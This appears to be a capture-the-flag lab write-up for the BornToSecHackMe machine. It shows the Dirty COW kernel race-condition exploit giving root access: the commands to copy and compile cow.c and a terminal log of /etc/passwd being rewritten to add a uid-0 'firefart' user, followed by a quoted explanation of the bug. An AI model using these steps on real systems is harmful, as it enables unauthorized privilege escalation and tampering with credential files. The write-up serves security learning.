## Dirty Cow exploit on zaz

let's directly ssh on zaz using writeup1 methods

ssh zaz@192.168.56.109

646da671ca01bb5d84dbb5fb2238dc8e

copy the script via scp:
scp cow.c zaz@192.168.56.109:~/

compile it: gcc -pthread cow.c -lcrypt

```
zaz@BornToSecHackMe:~$ ./a.out
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.

zaz@BornToSecHackMe:~$ 
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
su
Password: 
firefart@BornToSecHackMe:/home/zaz# whoami
firefart
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/zaz# 

```

## Explanation of the exploit

The Dirty COW exploit allows a malicious user to gain higher privileges on a Linux system by exploiting a race condition in the Copy-On-Write (COW) feature of the kernel, enabling them to write to files they should only be able to read.

GPT explanation:

```
Copy On Write Mechanism: Linux uses a memory management optimization called Copy On Write (COW). When a process wants to modify a piece of memory that's shared between multiple processes (like a memory-mapped file), the kernel will normally create a private copy (or "clone") of this memory for the process. This way, the original shared memory remains unchanged for other processes.

Shared Memory Modification: In the Dirty COW exploit, a process starts modifying a shared piece of memory that should trigger the COW mechanism.

Race Condition Exploit: Simultaneously, the same process or another process tries to write to this memory area. Due to a flaw in the kernel, there's a brief window of time (a race condition) where the memory changes can be written to the original shared memory, instead of a private copy. This is not supposed to happen under normal circumstances.

Privilege Escalation: This vulnerability is particularly serious because it can allow an unprivileged process (like a regular user process) to modify memory that it shouldn't have access to. This can include memory that belongs to the kernel itself or to other privileged processes. As a result, an attacker could use this exploit to gain elevated privileges on the system, potentially taking full control.
```